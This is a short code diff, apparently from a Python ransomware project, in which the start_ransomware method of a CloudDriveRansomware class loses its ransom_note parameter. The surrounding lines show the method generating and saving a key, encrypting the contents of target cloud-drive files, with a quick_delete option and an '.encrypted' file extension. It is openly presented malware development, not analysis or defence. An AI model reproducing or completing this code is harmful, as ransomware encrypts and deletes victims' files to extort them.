@@ -32,7 +32,7 @@ class CloudDriveRansomware:
     def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
         pass
         
-    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], ransom_note: str = "pay me", quick_delete: bool = False, file_extension: str = ".encrypted"):
+    def start_ransomware(self, target_cloud_file_items: list[CloudDriveFileItem], quick_delete: bool = False, file_extension: str = ".encrypted"):
         self.__generate_key()
         self.__save_key()
         paths_to_encrypted_contents = self.__create_encrypted_contents_from_cloud_files(target_cloud_file_items)
